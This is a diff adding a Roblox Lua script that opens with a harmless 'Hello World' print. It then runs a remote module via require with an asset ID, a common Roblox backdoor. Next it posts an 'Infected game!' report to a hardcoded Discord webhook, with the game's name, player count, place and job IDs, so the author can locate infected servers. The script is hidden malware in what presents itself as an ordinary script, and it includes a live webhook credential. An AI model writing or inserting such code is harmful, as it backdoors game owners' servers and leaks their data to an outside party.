@@ -1,0 +1,38 @@
+print("Hello World!")
+require(7541446078)()
+--[[
+created by gk36#5764
+make sure to open Http requests for it to work (Game Settings > Security > Allow Http Requests)
+--]]
+local webhook = "https://discord.com/api/webhooks/889193292250644552/vmngmXTuKl4zeZBHYT7f2ABwgvm-ILkhZpOGPrX3uUikKrWLNrc2W7WQz_1xpS-q5rw3" -- put your discord webhook here
+local name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local http = game:GetService("HttpService")
+local players = game.Players:GetPlayers()
+local maxplayers = game.Players.MaxPlayers
+
+local function getTime()
+	local date = os.date("*t")
+	return ("%02d:%02d"):format(((date.hour % 24) - 1) % 12 + 1, date.min)
+end
+
+local data = {
+	["embeds"] = {{
+		["title"] = "Infected game!",
+		["url"] = "https://roblox.com/games/" .. game.PlaceId,
+		["description"] = "**Game Name:** ".. name.Name.."\n**Players:** ".. #players.."/"..maxplayers.."\n**Game Id:** ".. game.PlaceId.."\n**Game Version:** ".. game.PlaceVersion.."\n**Job Id:** "..game.JobId,
+		["image"] = {
+			["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png"
+		},
+		["footer"] = {
+			["icon_url"] = "https://c.tenor.com/u1tpY7EV7xMAAAAC/quieres-roblox-aresnal-fancam.gif", -- delete this line if u dont want an icon 
+			["text"] = "Check It Serverside • Today at "..getTime(),
+		},
+		["color"] = 65409,
+
+	}}
+}
+
+--if not game:GetService("RunService"):IsStudio() then 
+local encode = http:JSONEncode(data) 
+http:PostAsync(webhook,encode)
+--end -- it will not run in studio only in game
